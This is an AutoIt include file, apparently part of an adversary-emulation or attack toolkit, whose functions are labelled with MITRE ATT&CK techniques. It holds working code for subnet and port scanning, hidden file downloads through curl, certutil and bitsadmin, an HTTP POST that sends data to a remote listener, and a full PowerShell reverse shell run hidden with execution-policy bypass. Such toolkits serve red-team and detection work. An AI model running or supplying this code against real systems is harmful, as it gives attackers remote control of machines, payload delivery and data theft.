#include-once

; Network I/O: reachability checks, scanning, download, upload, C2

Func IsInternetReachable() ;DESCRIPTION:Return True if an external host is pingable;MITRE:Discovery T1016
   Return Ping("wikipedia.org", 250) > 0
EndFunc

Func DnsLookup($sAddress) ;DESCRIPTION:Run nslookup — returns output string or 0 if the host is non-existent;MITRE:Discovery T1018
   Local $sResult = ExecCommand("nslookup " & $sAddress)
   If StringInStr($sResult, "NON-EXISTENT") Then Return 0
   Return $sResult
EndFunc

Func ScanTcpPort($sIp, $iPort) ;DESCRIPTION:Return "open" or "closed" for a given TCP endpoint;MITRE:Discovery T1046
   TCPStartup()
   Local $hSocket = TCPConnect($sIp, $iPort)
   TCPShutdown()
   Return $hSocket > 0 ? "open" : "closed"
EndFunc

Func ScanSubnet($iPort, $iStartHost, $iStopHost) ;DESCRIPTION:Scan the local /24 subnet for hosts with a port open; returns array [0]=count,[1..n]=IPs or False;MITRE:Discovery T1046
   Local $aParts    = StringSplit(@IPAddress1, ".")
   Local $sNetwork  = $aParts[1] & "." & $aParts[2] & "." & $aParts[3] & "."
   Local $iOwnOctet = Int($aParts[4])
   Local $aHosts[1] = [0]
   For $i = $iStartHost To $iStopHost Step 1
      If $i = $iOwnOctet Then ContinueLoop
      If ScanTcpPort($sNetwork & $i, $iPort) = "open" Then
         $aHosts[0] += 1
         ReDim $aHosts[$aHosts[0] + 1]
         $aHosts[$aHosts[0]] = $sNetwork & $i
      EndIf
   Next
   If $aHosts[0] = 0 Then Return False
   Return $aHosts
EndFunc

Func DownloadFile($sUrl, $sMode, $sFilePath = @TempDir & "\drop.tmp") ;DESCRIPTION:Download a file — $sMode: "native" | "curl" | "certutil" | "bits";MITRE:CommandAndControl T1105
   Select
      Case $sMode == "native"
         Local $hDownload = InetGet($sUrl, $sFilePath, 1, 1)
         Do
            Sleep(250)
         Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)
      Case $sMode == "curl"
         RunWait("curl " & $sUrl & " --output " & $sFilePath, "", @SW_HIDE)
      Case $sMode == "certutil"
         RunWait("certutil.exe -urlcache -f " & $sUrl & " " & $sFilePath, "", @SW_HIDE)
      Case $sMode == "bits"
         RunWait("bitsadmin /transfer aptjob /download /priority normal " & $sUrl & " " & $sFilePath, "", @SW_HIDE)
   EndSelect
EndFunc

Func FetchUrl($sUrl) ;DESCRIPTION:Return the raw content of a remote HTTP/S page;MITRE:CommandAndControl T1102
   Return _INetGetSource($sUrl)
EndFunc

Func HttpPost($sHost, $sTag, $sPort = "80", $sData = "") ;DESCRIPTION:HTTP POST data to a remote listener;MITRE:Exfiltration T1041
   Local $oHttp = ObjCreate("WinHttp.WinHttpRequest.5.1")
   $oHttp.Open("POST", "http://" & $sHost & ":" & $sPort, False)
   $oHttp.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
   $oHttp.Send($sTag & "=" & $sData)
   If @error Then Return False
   Return $oHttp.ResponseText
EndFunc

Func ReverseShell($sRemoteIp, $iRemotePort) ;DESCRIPTION:Open a PowerShell TCP reverse shell to a remote listener;MITRE:Execution T1059.001,CommandAndControl T1095
   Local $sPsCmd = "$client = [System.Net.Sockets.TCPClient]::new('" & $sRemoteIp & "'," & $iRemotePort & ");" & _
                   "[byte[]]$bytes = (0..65535).ForEach{ 0 };" & _
                   "$stream = $client.GetStream();" & _
                   "while ($i = $stream.Read($bytes, 0, $bytes.Length)) {" & _
                   "$data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i);" & _
                   "$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);" & _
                   "$prompt = $sendback + 'PS ' + $PWD.Path + '> ';" & _
                   "$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt);" & _
                   "$stream.Write($sendbyte, 0, $sendbyte.Length);" & _
                   "$stream.Flush()};" & _
                   "$client.Close()"
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nop -exec bypass -c " & $sPsCmd)
EndFunc
